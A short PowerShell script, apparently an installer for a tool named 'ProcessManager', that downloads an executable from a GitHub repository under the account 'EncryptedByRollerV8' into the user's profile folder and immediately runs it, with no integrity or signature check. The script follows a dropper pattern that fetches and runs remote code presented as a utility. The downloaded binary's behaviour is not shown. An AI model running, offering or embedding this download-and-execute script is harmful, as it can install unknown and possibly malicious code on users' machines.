# Get current user's folder
$userFolder = $env:USERPROFILE
$destination = "$userFolder\ProcessManager.exe"

Write-Host "Downloading to: $destination"

try {
    # Download the file
    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/EncryptedByRollerV8/f/main/ProcessManager.exe" -OutFile $destination -UseBasicParsing
    
    # Run the file
    if (Test-Path $destination) {
        Write-Host "Download successful! Starting ProcessManager..."
        Start-Process -FilePath $destination
    }
}
catch {
    Write-Host "Error: $($_.Exception.Message)"
}

Write-Host "Press any key to close..."
$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
